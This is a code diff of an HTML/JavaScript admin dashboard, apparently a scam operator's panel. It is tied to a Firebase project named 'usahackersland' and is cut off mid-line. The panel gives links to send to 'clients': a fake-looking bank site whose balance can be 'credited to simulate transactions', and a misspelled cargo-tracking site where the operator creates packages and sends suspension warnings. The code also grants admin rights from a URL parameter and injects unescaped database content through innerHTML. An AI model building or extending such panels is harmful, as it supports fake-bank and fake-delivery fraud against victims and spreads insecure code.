@@ -1,249 +1,150 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Dashboard Home</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #000;
-      color: lime;
-      margin: 0;
-      padding: 20px;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard Home</title>
+<style>
+  body {font-family: Arial, sans-serif; background: #000; color: lime; margin:0; padding:20px;}
+  .emergency-box {background:#111; border:2px solid #ff3333; border-radius:12px; padding:20px; margin:20px auto; color:#ff4444; max-width:1000px; text-align:center; font-size:16px; box-shadow:0 0 15px rgba(255,0,0,0.5);}
+  .emergency-box img {max-width:100%; border-radius:10px; margin-top:10px;}
+  .admin-controls {margin-top:15px; display:none;}
+  .admin-controls button {margin:5px; padding:8px 12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold;}
+  .btn-edit { background: lime; color: black; }
+  .btn-delete { background: red; color: white; }
 
-    /* Emergency box */
-    .emergency-box {
-      background: #111;
-      border: 2px solid #ff3333;
-      border-radius: 12px;
-      padding: 20px;
-      margin: 20px auto;
-      color: #ff4444;
-      max-width: 1000px;
-      text-align: center;
-      font-size: 16px;
-      box-shadow: 0 0 15px rgba(255,0,0,0.5);
-    }
-    .emergency-box img {
-      max-width: 100%;
-      border-radius: 10px;
-      margin-top: 10px;
-    }
+  .dashboard-grid {display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:20px;}
+  .dashboard-section {background:#111; border-radius:12px; padding:20px; box-shadow:0 2px 8px rgba(0,0,0,0.4); color:lime; text-align:center;}
+  .dashboard-section h2 {margin-bottom:10px; color:limegreen; font-size:20px;}
+  .dashboard-section p {font-size:14px; margin-bottom:4px;}
+  .link-box {background:#000; padding:8px; border:1px solid lime; border-radius:6px; margin-bottom:5px; font-size:14px; word-break:break-all; color:lime;}
+  .link-desc {font-size:13px; color:#adff2f; margin-bottom:8px;}
+  .btn {display:inline-block; padding:10px 15px; margin:5px; border-radius:6px; border:none; font-weight:bold; cursor:pointer; text-decoration:none;}
+  .btn-lime { background: lime; color: black; }
+  .btn-green { background: green; color: white; }
+  .btn-copy { background: #333; color: lime; border: 1px solid lime; }
+  .btn-warning { font-weight: bold; cursor: pointer; }
 
-    /* Admin controls */
-    .admin-controls {
-      margin-top: 15px;
-      display: none; /* hidden by default for users */
-    }
-    .admin-controls button {
-      margin: 5px;
-      padding: 8px 12px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    .btn-edit { background: lime; color: black; }
-    .btn-delete { background: red; color: white; }
+  /* Notification panel */
+  #notifPanel {position:fixed; top:20px; right:20px; width:320px; z-index:3000;}
+  .notif {background:#111; border-left:4px solid #28a745; color:lime; padding:12px; margin-bottom:10px; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.6); display:flex; justify-content:space-between; align-items:center; animation: flash 1s ease;}
+  @keyframes flash {0%,100%{background:#d4edda;}50%{background:#111;}}
+  .notif button {margin-left:5px; padding:4px 8px; border:none; border-radius:6px; font-weight:bold; cursor:pointer; background:#004080; color:#fff;}
+  .tone-selector {margin:10px 0; text-align:center;}
+  .tone-selector select {padding:6px 12px; border-radius:6px; font-weight:bold; margin-right:5px;}
+  .tone-selector button {padding:6px 10px; border-radius:6px; font-weight:bold; cursor:pointer; background:lime; color:black; border:none;}
 
-    /* Grid layout */
-    .dashboard-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-      margin-top: 20px;
-    }
-
-    /* Dashboard section */
-    .dashboard-section {
-      background: #111;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
-      color: lime;
-      text-align: center;
-    }
-    .dashboard-section h2 {
-      margin-bottom: 10px;
-      color: limegreen;
-      font-size: 20px;
-    }
-    .dashboard-section p {
-      font-size: 14px;
-      margin-bottom: 4px;
-    }
-
-    /* Link box */
-    .link-box {
-      background: #000;
-      padding: 8px;
-      border: 1px solid lime;
-      border-radius: 6px;
-      margin-bottom: 5px;
-      font-size: 14px;
-      word-break: break-all;
-      color: lime;
-    }
-    .link-desc {
-      font-size: 13px;
-      color: #adff2f;
-      margin-bottom: 8px;
-    }
-
-    /* Buttons */
-    .btn {
-      display: inline-block;
-      padding: 10px 15px;
-      margin: 5px;
-      border-radius: 6px;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: none;
-    }
-    .btn-lime { background: lime; color: black; }
-    .btn-green { background: green; color: white; }
-    .btn-copy { background: #333; color: lime; border: 1px solid lime; }
-    .btn-warning { font-weight: bold; cursor: pointer; }
-
-    @media (max-width: 900px) {
-      .dashboard-grid { grid-template-columns: 1fr; }
-    }
-  </style>
+  @media(max-width:900px){.dashboard-grid{grid-template-columns:1fr;}}
+</style>
 </head>
 <body>
 
-  <!-- Emergency Message -->
-  <div id="emergencyBox" class="emergency-box">
-    🚨 Loading emergency message...🔔
-    <div class="admin-controls" id="adminControls">
-      <button class="btn-edit" onclick="editEmergency()">✏️ Edit</button>
-      <button class="btn-delete" onclick="deleteEmergency()">🗑️ Delete</button>
-    </div>
+<!-- Emergency -->
+<div id="emergencyBox" class="emergency-box">
+🚨 Loading emergency message...
+<div class="admin-controls" id="adminControls">
+  <button class="btn-edit" onclick="editEmergency()">✏️ Edit</button>
+  <button class="btn-delete" onclick="deleteEmergency()">🗑️ Delete</button>
+</div>
+</div>
+
+<!-- Dashboard Grid -->
+<div class="dashboard-grid">
+  <!-- BANK Section -->
+  <div class="dashboard-section">
+    <h2>🏛️ BANK</h2>
+    <p>Copy this link and send to your client:</p>
+    <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
+    <div class="link-desc">➡️ This is the link you send to clients for banking services.</div>
+    <button class="btn btn-copy" onclick="copyText('bankLink')">📋 Copy</button><br>
+    <p>Open account here to register:</p>
+    <div class="link-desc">👉 Click to open the registration page to start creating a client account.</div>
+    <button class="btn btn-lime" onclick="openInDashboard('https://sp0m.com')">Open Account</button>
+    <p>Credit your bank account:</p>
+    <div class="link-desc">➡️ Click this to add credit to your account to simulate transactions.</div>
+    <button class="btn btn-green" onclick="openInDashboard('https://bulksms4.github.io/BANKING/create-account.html')">💵💰 Credit your bank account 🪙</button>
   </div>
 
-  <div class="dashboard-grid">
-    <!-- 🏛️ Bank Section -->
-    <div class="dashboard-section">
-      <h2>🏛️ BANK</h2>
-
-      <p>Copy this link and send to your client:</p>
-      <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
-      <div class="link-desc">➡️ This is the link you send to clients for banking services.</div>
-      <button class="btn btn-copy" onclick="copyText('bankLink')">📋 Copy</button><br>
-
-      <p>Open account here to register:</p>
-      <div class="link-desc">👉 Click to open the registration page to start creating a client account.</div>
-      <button class="btn btn-lime" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://sp0m.com')">
-        Open Account
-      </button>
-
-      <p>Credit your bank account:</p>
-      <div class="link-desc">➡️ Click this to add credit to your account to simulate transactions.</div>
-      <button class="btn btn-green" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://bulksms4.github.io/BANKING/create-account.html')">
-        💵💰 Credit your bank account 🪙
-      </button>
-    </div>
-
-    <!-- ✈️🚢 Track & Package Section -->
-    <div class="dashboard-section">
-      <h2>✈️🚢 Track Package 🛍️🛒</h2>
-
-      <p>Copy the link below and send to your client:</p>
-      <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
-      <div class="link-desc">👉 Give this link to your client to track the package you send.</div>
-      <button class="btn btn-copy" onclick="copyText('trackLink')">📋 Copy</button><br>
-
-      <p>Open the account to create packages:</p>
-      <div class="link-desc">📦 Creating anything that concerns packages for your client.</div>
-      <button class="btn btn-lime" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://bulksms4.github.io/x-cargo-exprees/create.html')">
-        📦 Click here to Create Package
-      </button>
-
-      <p>Update the package status:</p>
-      <div class="link-desc">⚠️ Suspend a package or send warning messages to your client package.</div>
-      <button class="btn btn-warning" style="font-size:16px; padding:12px 18px; background: linear-gradient(90deg, #ff4444, #ffbb33); color: black;" onclick="openInDashboard('https://bulksms4.github.io/x-cargo-exprees/update-status.html')">
-        ⚠️ Click here to Update Package Or suspend/Process
-      </button>
-    </div>
+  <!-- Track & Package Section -->
+  <div class="dashboard-section">
+    <h2>✈️🚢 Track Package 🛍️🛒</h2>
+    <p>Copy the link below and send to your client:</p>
+    <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
+    <div class="link-desc">👉 Give this link to your client to track the package you send.</div>
+    <button class="btn btn-copy" onclick="copyText('trackLink')">📋 Copy</button><br>
+    <p>Open the account to create packages:</p>
+    <div class="link-desc">📦 Creating anything that concerns packages for your client.</div>
+    <button class="btn btn-lime" onclick="openInDashboard('https://bulksms4.github.io/x-cargo-exprees/create.html')">📦 Click here to Create Package</button>
+    <p>Update the package status:</p>
+    <div class="link-desc">⚠️ Suspend a package or send warning messages to your client package.</div>
+    <button class="btn btn-warning" onclick="openInDashboard('https://bulksms4.github.io/x-cargo-exprees/update-status.html')">⚠️ Update Package / Suspend</button>
   </div>
+</div>
 
-  <!-- Firebase -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<!-- Notification Panel -->
+<div id="notifPanel">
+  <div class="tone-selector">
+    <label>Select Tone:</label>
+    <select id="toneSelect">
+      <option value="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg">Alarm Clock</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/beep_short.ogg">Beep Short</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg">Digital Watch</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/bugle_tune.ogg">Bugle Tune</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/doorbell.ogg">Doorbell</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/telephone_ring.ogg">Telephone Ring</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/coin_drop.ogg">Coin Drop</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/success.ogg">Success Tone</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/warning.ogg">Warning Tone</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/bell_ring.ogg">Bell Ring</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/chime.ogg">Chime</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/retro_game.ogg">Retro Game</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/fx_alert.ogg">FX Alert</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/magic_chime.ogg">Magic Chime</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/notification.ogg">Notification</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/soft_beep.ogg">Soft Beep</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/triple_beep.ogg">Triple Beep</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/short_bell.ogg">Short Bell</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/glass_ping.ogg">Glass Ping</option>
+      <option value="https://actions.google.com/sounds/v1/alarms/buzzer.ogg">Buzzer</option>
+    </select>
+    <button onclick="previewTone()">🔊 Preview</button>
+  </div>
+</div>
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-      authDomain: "usahackersland.firebaseapp.com",
-      projectId: "usahackersland",
-      storageBucket: "usahackersland.appspot.com",
-      messagingSenderId: "588407428267",
-      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
-      measurementId: "G-ZJ05T7YNSQ"
-    };
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com",
+  messagingSenderId: "588407428267",
+  appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
+  measurementId: "G-ZJ05T7YNSQ"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+const database = firebase.database();
 
-    const emergencyBox = document.getElementById("emergencyBox");
-    const adminControls = document.getElementById("adminControls");
+const emergencyBox = document.getElementById("emergencyBox");
+const adminControls = document.getElementById("adminControls");
 
-    // Check admin role via URL param
-    const urlParams = new URLSearchParams(window.location.search);
-    const isAdmin = urlParams.get("role") === "admin";
+const urlParams = new URLSearchParams(window.location.search);
+const isAdmin = urlParams.get("role") === "admin";
+if (isAdmin) adminControls.style.display="block";
 
-    if (isAdmin) {
-      adminControls.style.display = "block";
-    }
-
-    // Listen for emergency message
-    db.collection("emergency").doc("current").onSnapshot(doc => {
-      if (doc.exists) {
-        const data = doc.data();
-        emergencyBox.innerHTML = `
-          ${data.text ? `<p>${data.text}</p>` : ""}
-          ${data.image ? `<img src="${data.image}" alt="Emergency Image">` : ""}
-          ${data.phone ? `<p>📞 Call: <a href="tel:${data.phone}">${data.phone}</a></p>` : ""}
-          ${data.link ? `<p>🔗 <a href="${data.link}" target="_blank">${data.link}</a></p>` : ""}
-        `;
-        if (isAdmin) emergencyBox.appendChild(adminControls);
-      } else {
-        emergencyBox.innerText = "🚨 No emergency messages at the moment.";
-      }
-    });
-
-    // Copy helper
-    function copyText(id) {
-      const text = document.getElementById(id).innerText;
-      navigator.clipboard.writeText(text).then(() => {
-        alert("✅ Link copied: " + text);
-      });
-    }
-
-    // Open links in dashboard iframe if available
-    function openInDashboard(url) {
-      if (window.parent && window.parent.document.getElementById("dashboardFrame")) {
-        window.parent.document.getElementById("dashboardFrame").src = url;
-      } else {
-        window.location.href = url;
-      }
-    }
-
-    // Admin emergency functions
-    function editEmergency() {
-      const newText = prompt("✏️ Enter new emergency text:");
-      if (newText) {
-        db.collection("emergency").doc("current").set({ text: newText }, { merge: true });
-      }
-    }
-    function deleteEmergency() {
-      if (confirm("🗑️ Delete the emergency message?")) {
-        db.collection("emergency").doc("current").delete();
-      }
-    }
-  </script>
-</body>
-</html>
+// Emergency messages
+db.collection("emergency").doc("current").onSnapshot(doc=>{
+  if(doc.exists){
+    const data=doc.data();
+    emergencyBox.innerHTML=`
+      ${data.text?`<p>${data.text}</p>`:""}
+      ${data.image?`<img src="${data.image}" alt="Emergency Image">`:""}
+      ${data.phone?`<p>📞 Call: <a href="tel:${data.phone}">${data.phone}</a></p>`:""}
+      ${data.link?`<p>🔗 <a href="${data.link}" target="_blank">${data.link}</a></p>`:""}
+    `;
+    if(isAdmin) emergencyBox.appendChild(adminControls);
+  } else { emergencyBox.innerText="🚨 No emergency messages
